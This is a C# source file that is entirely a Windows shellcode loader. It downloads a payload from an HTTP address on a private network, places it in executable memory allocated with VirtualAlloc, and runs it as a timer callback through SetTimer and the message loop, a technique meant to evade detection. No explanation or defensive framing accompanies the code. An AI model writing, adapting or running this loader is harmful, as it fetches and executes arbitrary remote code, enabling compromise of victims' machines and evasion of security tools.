using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SetTimer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            UIntPtr nIDEvent = UIntPtr.Zero; 
            SetTimer(IntPtr.Zero, nIDEvent, 0, addr);

            IntPtr lpMsg = IntPtr.Zero;
            GetMessageW(ref lpMsg, IntPtr.Zero, 0, 0);

            DispatchMessageW(ref lpMsg);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("user32.dll")]
        static extern UIntPtr SetTimer(IntPtr hWnd, UIntPtr nIDEvent, uint uElapse, IntPtr lpTimerFunc);

        [DllImport("user32.dll")]
        static extern bool GetMessageW(ref IntPtr lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        static extern IntPtr DispatchMessageW(ref IntPtr lpMsg);
    }

}

